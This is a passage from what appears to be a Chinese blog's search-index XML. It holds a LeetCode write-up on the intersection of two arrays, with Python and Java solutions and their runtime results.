class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>怎么优化？🤔首先对第一个数组遍历时，同时保存元素及其出现次数，然后遍历第二个数组时，判断其是否已经保存，如果已经存在那么就是重复的元素；如何去重？🤔如果对最后的结果再次去重，这样会提高复杂度，如果在保存的时候就能判断是否需要保存就好了。</p><p>这样就想到了使用字典，去重时是这么处理的：在第二次循环时如果元素已经存在了，就将其保存并从字典中去除。这种方法的时间复杂度是<code>O(m+n)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">intersection</span>(<span class="hljs-params">self, nums1: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>], nums2: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>        m = &#123;&#125;<br>        res = []<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums1:<br>            m[n] = m.get(n, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums2:<br>            <span class="hljs-keyword">if</span> m.get(n, <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span>:<br>                m.pop(n)<br>                res.append(n)<br>        <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>最后运行结果为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">执行用时：<span class="hljs-number">40</span> ms, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">59.53</span><span class="hljs-meta">%</span>的用户<br>内存消耗：<span class="hljs-number">15.1</span> MB, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">26.27</span><span class="hljs-meta">%</span>的用户<br>通过测试用例：<span class="hljs-number">55</span> / <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><hr><hr><p>在学java，记录一个java的题解。方法还是暴力，依次判断一个数组的元素是否在另一个数组中，将结果保存在<code>HashSet</code>中可以去重，最后将<code>HashSet</code>转换为数组返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] intersection(<span class="hljs-type">int</span>[] nums1, <span class="hljs-type">int</span>[] nums2) &#123;<br>        Set&lt;Integer&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>        <span class="hljs-keyword">if</span> (nums1 == <span class="hljs-literal">null</span> || nums2 == <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">len1</span> <span class="hljs-operator">=</span> nums1.length;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len2</span> <span class="hljs-operator">=</span> nums2.length;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len1; i++)&#123;<br>            <span class="hljs-keyword">if</span> (checkIsExist(nums2, nums1[i]))&#123;<br>                result.add(nums1[i]);<br>            &#125;<br>        &#125;<br>  <br>        <span class="hljs-type">int</span>[] finalResult = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[result.size()];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> item : result)&#123;<br>            finalResult[start] = item;<br>            start++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> finalResult;<br>    &#125;<br><br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkIsExist</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums2, <span class="hljs-type">int</span> cur)</span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums2.length; i++)&#123;<br>            <span class="hljs-keyword">if</span> (nums2[i] == cur)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后运行结果为</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">执行用时：<span class="hljs-number">2</span> ms, 在所有 Java 提交中击败了<span class="hljs-number">95.30</span><span class="hljs-comment">%的用户</span><br>内存消耗：<span class="hljs-number">41.6</span> MB, 在所有 Java 提交中击败了<span class="hljs-number">44.51</span><span class="hljs-comment">%的用户</span><br>通过测试用例：<span class="hljs-number">55</span> / <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>复现一下python的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] intersection(<span class="hljs-type">int</span>[] nums1, <span class="hljs-type">int</span>[] nums2) &#123;<br><br>        HashMap&lt;Integer, Integer&gt; mp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Integer, Integer&gt;();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : nums1)&#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> mp.getOrDefault(n, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br><br>            mp.put(n, c);<br><br>        &#125;<br><br>  <br><br>        Set&lt;Integer&gt; ks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : nums2)&#123;<br><br>            <span class="hljs-keyword">if</span> (mp.getOrDefault(n, <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span>)&#123;<br><br>                ks.add(n);<br><br>            &#125;<br><br>        &#125;<br><br>  <br><br>        <span class="hljs-type">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[ks.size()];<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>  <br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k : ks)&#123;<br><br>            res[start] = k;<br><br>            start++;<br><br>        &#125;<br><br>  <br><br>        <span class="hljs-keyword">return</span> res;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">执行用时：<span class="hljs-number">3</span> ms, 在所有 Java 提交中击败了<span class="hljs-number">41.24</span><span class="hljs-comment">%的用户</span><br>内存消耗：<span class="hljs-number">41.4</span> MB, 在所有 Java 提交中击败了<span class="hljs-number">67.01</span><span class="hljs-comment">%的用户</span><br>通过测试用例：<span class="hljs-number">55</span> / <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
      <category>技能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>python</tag>
      
      <tag>java</tag>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
